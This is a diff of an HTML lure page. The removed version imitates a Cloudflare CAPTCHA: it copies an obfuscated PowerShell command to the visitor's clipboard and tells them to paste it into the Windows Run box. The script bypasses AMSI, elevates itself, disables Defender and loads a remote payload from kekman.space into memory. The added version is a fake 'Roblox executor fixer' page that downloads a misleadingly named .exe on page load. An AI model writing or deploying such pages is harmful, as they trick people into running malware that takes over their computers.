@@ -1,439 +1,271 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Cloudflare Security Check</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-      background-color: #fcfcfc;
-      color: #333;
-    }
-    .main-wrapper {
-      align-items: center;
-      display: flex;
-      flex: 1;
-      flex-direction: column;
-      padding: 20px;
-    }
-    .main-content {
-      max-width: 60rem;
-      width: 100%;
-      margin: 4rem auto;
-      padding: 0 1.5rem;
-    }
-    .logo-container {
-      display: flex;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-    .logo-img {
-      height: 2rem;
-      margin-right: 0.5rem;
-    }
-    .domain-title {
-      font-size: 2.5rem;
-      font-weight: 500;
-    }
-    .text-container {
-      font-size: 1.5rem;
-      font-weight: 550;
-      margin-bottom: 2rem;
-      min-height: 2rem;
-    }
-    .checkbox-window {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 300px;
-      background-color: #fafafa;
-      border: 1px solid #e0e0e0;
-      border-radius: 4px;
-      padding: 10px;
-      transition: width 0.5s ease-in-out, height 0.5s ease-in-out;
-      margin-bottom: 20px;
-    }
-    .checkbox-window-inner {
-      display: flex;
-      align-items: center;
-      width: 100%;
-    }
-    .checkbox-container {
-      width: 30px;
-      height: 28px;
-      margin-right: 12px;
-      position: relative;
-    }
-    .checkbox {
-      width: 100%;
-      height: 100%;
-      background-color: #fff;
-      border-radius: 2px;
-      border: 2px solid #888;
-      cursor: pointer;
-      transition: border-color 0.3s, background-color 0.3s;
-    }
-    .checkbox.checked {
-      border-color: #4285f4;
-      background-color: #4285f4;
-      position: relative;
-    }
-    .checkbox.checked::after {
-      content: "\f00c";
-      font-family: "FontAwesome";
-      color: #fff;
-      font-size: 18px;
-      position: absolute;
-      top: -2px;
-      left: 2px;
-    }
-    .tettx {
-      flex: 1;
-      color: #4e4e4e;
-    }
-    .tettx p {
-      margin: 0 !important;
-    }
-    .legal-links {
-      font-size: 8px;
-      text-align: right;
-      margin-left: auto;
-    }
-    .legal-links img {
-      width: 67px;
-      height: 23px;
-      margin-bottom: 5px;
-    }
-    .legal-links p {
-      text-decoration: underline;
-    }
-    .verify-window {
-      font-family: Roboto, helvetica, arial, sans-serif;
-      opacity: 0;
-      visibility: hidden;
-      width: 100%;
-      height: 0;
-      transition: opacity 0.5s, height 0.5s;
-      border-top: 1px solid #797979;
-      padding-top: 3px;
-      margin-top: 15px;
-    }
-    .verify-window.active {
-      opacity: 1;
-      visibility: visible;
-      height: auto;
-      display: block;
-    }
-    .verify-main {
-      padding: 16px;
-      font-size: 14px;
-      color: #333;
-    }
-    .verify-main p:first-of-type {
-      font-size: 18px;
-      margin-bottom: 15px;
-    }
-    .verify-main ol {
-      padding-left: 20px;
-    }
-    .verify-main ol li {
-      margin-bottom: 10px;
-    }
-    .verify-main code {
-      display: block;
-      margin-top: 10px;
-      background-color: #f9f9f9;
-      padding: 10px;
-      font-size: 12px;
-      border: 1px solid #ddd;
-    }
-    .verify-main .observe {
-      padding-top: 10px;
-    }
-    .verify-main .observe code {
-      background: none;
-      border: 1px solid #797979;
-      color: #d9d9d9;
-    }
-    .verify-footer {
-      background-color: #f2f2f2;
-      padding: 16px;
-      text-align: right;
-    }
-    .verify-footer-container {
-      background: none;
-    }
-    .verify-footer-left {
-      float: left;
-      text-align: left;
-      font-size: 15px;
-    }
-    .verify-verify-button {
-      background: #5e5e5e;
-      padding: 9px 38px;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .verify-verify-button:hover {
-      background: #4a4a4a;
-    }
-    .footer {
-      font-size: 0.75rem;
-      line-height: 1.125rem;
-      max-width: 60rem;
-      margin: 0 auto;
-      padding: 1rem 1.5rem;
-      width: 100%;
-      border-top: 1px solid #d9d9d9;
-      text-align: center;
-    }
-    .footer-inner > div:first-child {
-      margin-bottom: 5px;
-    }
-    .footer-inner code {
-      font-family: monospace;
-    }
-    .domain-footer {
-      font-size: 1.5rem;
-      line-height: 2.25rem;
-      margin-top: 33px;
-    }
-    .step1, .step2 { display: none; }
-    .step1.active, .step2.active { display: block; }
-    .step3 { display: none; }
-    .step3.active { display: block; }
-    .success-icon {
-      width: 30px;
-      height: 30px;
-    }
-    .success-icon circle { fill: #28a745; }
-    .success-icon path {
-      stroke: white;
-      stroke-width: 4;
-      fill: none;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-    .spinner {
-      visibility: hidden;
-      display: none;
-    }
-    .spinner.visible {
-      visibility: visible;
-      display: block;
-    }
-    .lds-ring {
-      display: inline-block;
-      position: relative;
-      height: 1.875rem;
-      width: 1.875rem;
-    }
-    .lds-ring div {
-      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-      border: 0.3rem solid transparent;
-      border-radius: 50%;
-      border-top-color: #313131;
-      box-sizing: border-box;
-      display: block;
-      position: absolute;
-      height: 1.875rem;
-      width: 1.875rem;
-    }
-    .lds-ring div:first-child { animation-delay: -0.45s; }
-    .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
-    .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
-    @keyframes lds-ring {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @media (prefers-color-scheme: dark) {
-      body .lds-ring div { border-color: #676767 transparent transparent; }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox executor fixer — Download</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #0b0d10;
+    --bg-raised: #12151a;
+    --line: #23282f;
+    --text: #e9e6dd;
+    --text-dim: #8a8f97;
+    --crust: #f2a93b;
+    --crust-dim: #7a5a20;
+  }
+
+  *{ box-sizing: border-box; }
+
+  html, body{
+    margin:0;
+    padding:0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Space Grotesk', sans-serif;
+    min-height: 100vh;
+  }
+
+  body{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding: 24px;
+    position: relative;
+    overflow-x:hidden;
+  }
+
+  /* subtle scanline / grid texture, futuristic but quiet */
+  body::before{
+    content:"";
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--line) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line) 1px, transparent 1px);
+    background-size: 64px 64px;
+    opacity: 0.12;
+    pointer-events: none;
+  }
+
+  body::after{
+    content:"";
+    position: fixed;
+    top: -20%;
+    left: 50%;
+    width: 900px;
+    height: 900px;
+    transform: translateX(-50%);
+    background: radial-gradient(circle, rgba(242,169,59,0.10) 0%, rgba(242,169,59,0) 65%);
+    pointer-events: none;
+  }
+
+  .card{
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 560px;
+    border: 1px solid var(--line);
+    background: var(--bg-raised);
+    padding: 48px 40px 40px;
+  }
+
+  .terminal-row{
+    display:flex;
+    align-items:center;
+    justify-content: space-between;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 0.02em;
+    padding-bottom: 20px;
+    margin-bottom: 32px;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .dot{
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--crust);
+    display:inline-block;
+    margin-right: 8px;
+    box-shadow: 0 0 8px var(--crust);
+    animation: pulse 2.4s ease-in-out infinite;
+  }
+
+  @keyframes pulse{
+    0%, 100%{ opacity: 1; }
+    50%{ opacity: 0.35; }
+  }
+
+  h1{
+    font-size: 40px;
+    line-height: 1.05;
+    font-weight: 700;
+    margin: 0 0 12px;
+    letter-spacing: -0.01em;
+  }
+
+  h1 span{
+    color: var(--crust);
+  }
+
+  .tagline{
+    color: var(--text-dim);
+    font-size: 16px;
+    line-height: 1.5;
+    margin: 0 0 32px;
+    max-width: 46ch;
+  }
+
+  .specs{
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    row-gap: 8px;
+    padding: 16px 18px;
+    border: 1px solid var(--line);
+    margin-bottom: 32px;
+  }
+
+  .specs div:nth-child(odd){ color: var(--text-dim); }
+  .specs div:nth-child(even){ color: var(--text); text-align: right; }
+
+  .download-btn{
+    width: 100%;
+    background: var(--crust);
+    color: #1a1200;
+    border: none;
+    padding: 18px 24px;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    transition: transform 0.15s ease, background 0.15s ease;
+  }
+
+  .download-btn:hover{ background: #ffbe57; }
+  .download-btn:active{ transform: scale(0.99); }
+
+  .download-btn .arrow{
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .status{
+    min-height: 20px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top: 14px;
+  }
+
+  .fallback{
+    display:none;
+    margin-top: 16px;
+    padding-top: 16px;
+    border-top: 1px solid var(--line);
+  }
+
+  .fallback.show{ display:block; }
+
+  .fallback p{
+    font-size: 13px;
+    color: var(--text-dim);
+    margin: 0 0 12px;
+    line-height: 1.5;
+  }
+
+  .manual-link{
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: var(--crust);
+    text-decoration: none;
+    border: 1px solid var(--crust-dim);
+    padding: 10px 16px;
+  }
+
+  .manual-link:hover{
+    border-color: var(--crust);
+    background: rgba(242,169,59,0.08);
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .dot{ animation: none; }
+  }
+</style>
 </head>
 <body>
 
-<div class="main-wrapper">
-  <div class="main-content">
-    <!-- Logo -->
-    <div class="logo-container">
-      <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo" />
-      <p class="domain-title"><span class="domain-name"></span></p>
+  <div class="card">
+    <div class="terminal-row">
+      <span><span class="dot"></span>READY TO SERVE</span>
+      <span>BUILD 1.0.0</span>
     </div>
 
-    <div class="text-container">
-      <p><span class="textallstep">Verify you are human by completing the action below.</span></p>
+    <h1>Roblox<span>Executor</span>Fixer</h1>
+    <p class="tagline">Fix your roblox executor and player.</p>
+
+    <div class="specs">
+      <div>FILE</div><div>RobloxPlayerInstaller.exe</div>
+      <div>SIZE</div><div>—</div>
+      <div>PLATFORM</div><div>Windows</div>
+      <div>VERSION</div><div>1.0.0</div>
     </div>
 
-    <!-- Captcha box -->
-    <div id="checkbox-window" class="checkbox-window">
-      <div class="checkbox-window-inner">
-        <div class="checkbox-container">
-          <button type="button" id="checkbox" class="checkbox step1 active"></button>
-          <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
-            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-          </div>
-          <div class="step3" style="display: none;">
-            <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="25" cy="25" r="23"/>
-              <path d="M15 25 L22 32 L35 18"/>
-            </svg>
-          </div>
-        </div>
-        <div class="tettx">
-          <p class="step1 active">I'm not a robot</p>
-          <p class="step2" style="display: none;">Verification Steps</p>
-          <p class="step3" style="display: none;">Successfully.</p>
-        </div>
-        <div class="legal-links">
-          <!-- Fixed logo URL -->
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cloudflare_Logo.png/128px-Cloudflare_Logo.png" alt="Cloudflare Logo" />
-          <p>Confidentiality</p>
-          <p>Terms and Conditions</p>
-        </div>
-      </div>
+    <button class="download-btn" id="downloadBtn">
+      <span>Download for Windows</span>
+      <span class="arrow">.exe</span>
+    </button>
 
-      <div id="verify-window" class="verify-window">
-        <div class="verify-container">
-          <main class="verify-main">
-            <p>To prove you are not a robot, please:</p>
-            <ol>
-              <li>Press the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
-              <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
-              <li>Press <b>Enter</b> on your keyboard to finish.</li>
-            </ol>
-            <p class="observe">
-              You will observe and agree:<br />
-              <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
-            </p>
-          </main>
-        </div>
-        <div class="verify-container verify-footer verify-footer-container">
-          <div class="verify-footer-left">Perform the steps above to finish verification.</div>
-          <button type="button" class="verify-verify-button block" id="verify-button">Verify</button>
-        </div>
-      </div>
+    <div class="status" id="status"></div>
+
+    <div class="fallback" id="fallback">
+      <p>Didn't start automatically? Some browsers block auto-downloads of .exe files. Grab it manually instead:</p>
+      <a class="manual-link" id="manualLink" href="RobloxPlayerInstaller.exe" download="RobloxPlayerInstaller.exe">Manual download →</a>
     </div>
-
-    <p class="domain-footer">
-      <span class="domain-name"></span> needs to review the security of your connection before proceeding.
-    </p>
   </div>
-</div>
 
-<div class="footer" role="contentinfo">
-  <div class="footer-inner">
-    <div>
-      <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
-    </div>
-    <div>Platform performance and security <span style="color: #000000">Cloudflare</span></div>
-  </div>
-</div>
+  <a id="hiddenDownload" href="RobloxPlayerInstaller.exe" download="RobloxPlayerInstaller.exe" style="display:none;"></a>
 
-<script>
-(function() {
-  // ---- CONFIG ----
-  const CONFIG = {
-    command: 'powershell -e IyAtLS0tIEFNU0kgQllQQVNTIChvYmZ1c2NhdGVkKSAtLS0tCiRhbSA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzJykKJGFtLkdldEZpZWxkKCdhbXNpSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKS5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCiMgLS0tLSBTZWxmLWVsZXZhdGUgLS0tLQppZiAoLU5PVCAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV0iQWRtaW5pc3RyYXRvciIpKSB7CiAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLVZlcmIgUnVuQXMgLUFyZ3VtZW50TGlzdCAiLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBgIiQoJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuUGF0aClgIiIKICAgIGV4aXQKfQoKIyAtLS0tIERpc2FibGUgRGVmZW5kZXIgKG9iZnVzY2F0ZWQpIC0tLS0KJHAxPSdTZXQtTXBQcmVmJzskcDI9J2VyZW5jZSc7JGNtZD0kcDErJHAyCiRwcm9wcz1AKCdEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nJywnRGlzYWJsZUlPQVZQcm90ZWN0aW9uJywnRGlzYWJsZU5ldHdvcmtQcm90ZWN0aW9uJywnRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZycsJ0Rpc2FibGVCbG9ja0F0Rmlyc3RTZWVuJywnRGlzYWJsZUNsb3VkUHJvdGVjdGlvbicsJ0Rpc2FibGVBcmNoaXZlU2Nhbm5pbmcnLCdEaXNhYmxlU2NyaXB0U2Nhbm5pbmcnKQpmb3JlYWNoKCRwcm9wIGluICRwcm9wcyl7JiAkY21kIC0kcHJvcCAkdHJ1ZSAtRm9yY2V9CiRleGNsPSdBZGQtTXBQcmVmJysnZXJlbmNlJwomICRleGNsIC1FeGNsdXNpb25QYXRoICIkZW52OlRFTVAiIC1Gb3JjZQomICRleGNsIC1FeGNsdXNpb25QYXRoICIkZW52OlByb2dyYW1EYXRhIiAtRm9yY2UKCiMgLS0tLSBEb3dubG9hZCBCYXNlNjQgZnJvbSBzZXJ2ZXIgLS0tLQokd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiR3Yy5IZWFkZXJzLkFkZCgnVXNlci1BZ2VudCcsJ01vemlsbGEvNS4wJykKJGI2NCA9ICR3Yy5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9rZWttYW4uc3BhY2UvZW5jb2RlZC50eHQnKQojIFJlbW92ZSBhbnkgd2hpdGVzcGFjZS9uZXdsaW5lcwokYjY0ID0gJGI2NC5UcmltKCkgLXJlcGxhY2UgImByYG4iLCAiIiAtcmVwbGFjZSAiYG4iLCAiIiAtcmVwbGFjZSAiICIsICIiCgojIC0tLS0gRGVjb2RlIGFuZCBsb2FkIGFzc2VtYmx5IGluIG1lbW9yeSAtLS0tCiRieXRlcyA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYjY0KQokYXNtID0gW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkYnl0ZXMpCiRlbnRyeSA9ICRhc20uRW50cnlQb2ludAppZiAoJGVudHJ5KSB7CiAgICAkcGFyYW1zID0gJGVudHJ5LkdldFBhcmFtZXRlcnMoKQogICAgaWYgKCRwYXJhbXMuQ291bnQgLWVxIDEgLWFuZCAkcGFyYW1zWzBdLlBhcmFtZXRlclR5cGUgLWVxIFtzdHJpbmdbXV0pIHsKICAgICAgICAkZW50cnkuSW52b2tlKCRudWxsLCAoLCBbc3RyaW5nW11dIEAoKSkpCiAgICB9IGVsc2UgewogICAgICAgICRlbnRyeS5JbnZva2UoJG51bGwsICRudWxsKQogICAgfQp9IGVsc2UgewogICAgIyBmYWxsYmFjazogZmluZCBNYWluIG1ldGhvZAogICAgJG1haW4gPSAkYXNtLkdldFR5cGUoJ1Byb2dyYW0nKS5HZXRNZXRob2QoJ01haW4nLCBbUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpQdWJsaWMgLWJvciBbUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpTdGF0aWMpCiAgICBpZiAoJG1haW4pIHsgJG1haW4uSW52b2tlKCRudWxsLCAkbnVsbCkgfQp9'
-  };
+  <script>
+    const hiddenLink = document.getElementById('hiddenDownload');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const status = document.getElementById('status');
+    const fallback = document.getElementById('fallback');
 
-  // ---- Fill dynamic content ----
-  const hostname = window.location.hostname || 'kekman.space';
-  document.querySelectorAll('.domain-name').forEach(el => el.textContent = hostname);
+    let fallbackTimer = null;
 
-  // Ray ID
-  const rayChars = 'abcdef0123456789';
-  const rayId = Array.from({ length: 16 }, () => rayChars[Math.floor(Math.random() * rayChars.length)]).join('');
-  const rayEl = document.querySelector('.ray-id');
-  if (rayEl) rayEl.textContent = rayId;
-
-  // Verification ID
-  const verId = Math.floor(100000 + Math.random() * 900000);
-  const verEl = document.getElementById('verification-id');
-  if (verEl) verEl.textContent = verId;
-
-  // ---- Clipboard copy helper ----
-  function copyToClipboard(text) {
-    const textarea = document.createElement('textarea');
-    textarea.value = text;
-    textarea.setAttribute('readonly', '');
-    textarea.style.position = 'absolute';
-    textarea.style.left = '-9999px';
-    document.body.appendChild(textarea);
-    textarea.select();
-    try { document.execCommand('copy'); } catch (e) {}
-    document.body.removeChild(textarea);
-  }
-
-  // ---- Global copy listener (fallback) ----
-  document.addEventListener('copy', function(e) {
-    e.preventDefault();
-    if (e.clipboardData) {
-      e.clipboardData.setData('text/plain', CONFIG.command);
-    } else if (window.clipboardData) {
-      window.clipboardData.setData('Text', CONFIG.command);
+    function triggerDownload(){
+      hiddenLink.click();
+      status.textContent = 'Starting download…';
+      clearTimeout(fallbackTimer);
+      fallbackTimer = setTimeout(() => {
+        status.textContent = '';
+        fallback.classList.add('show');
+      }, 5000);
     }
-  });
 
-  // ---- Checkbox click: copy and show steps ----
-  const checkbox = document.getElementById('checkbox');
-  const checkboxWindow = document.getElementById('checkbox-window');
-  const verifyWindow = document.getElementById('verify-window');
-  const step1Text = document.querySelector('.tettx .step1');
-  const step2Text = document.querySelector('.tettx .step2');
-  const step3Text = document.querySelector('.tettx .step3');
-  const step1Checkbox = document.querySelector('.checkbox-container .step1');
-  const step2Spinner = document.querySelector('.checkbox-container .step2');
-  const step3Success = document.querySelector('.checkbox-container .step3');
-  const verifyButton = document.getElementById('verify-button');
+    // Attempt an automatic download shortly after the page loads.
+    window.addEventListener('load', () => {
+      status.textContent = 'Preparing download…';
+      setTimeout(triggerDownload, 600);
+    });
 
-  checkbox.addEventListener('click', function() {
-    copyToClipboard(CONFIG.command);
+    // Manual trigger via the big button too.
+    downloadBtn.addEventListener('click', triggerDownload);
+  </script>
 
-    step1Text.style.display = 'none';
-    step1Checkbox.style.display = 'none';
-    step2Text.style.display = 'block';
-    step2Spinner.style.display = 'block';
-    step2Spinner.style.visibility = 'visible';
-
-    checkboxWindow.style.width = '530px';
-    checkboxWindow.style.height = 'auto';
-    verifyWindow.classList.add('active');
-  });
-
-  verifyButton.addEventListener('click', function() {
-    verifyWindow.classList.remove('active');
-    checkboxWindow.style.height = '74px';
-    setTimeout(function() {
-      checkboxWindow.style.width = '300px';
-      step2Text.style.display = 'none';
-      step2Spinner.style.display = 'none';
-      step3Text.style.display = 'block';
-      step3Success.style.display = 'block';
-
-      setTimeout(function() {
-        step3Text.style.display = 'none';
-        step3Success.style.display = 'none';
-        step1Text.style.display = 'block';
-        step1Checkbox.style.display = 'block';
-        step2Spinner.style.visibility = 'hidden';
-      }, 1000);
-    }, 600);
-  });
-
-})();
-</script>
 </body>
 </html>
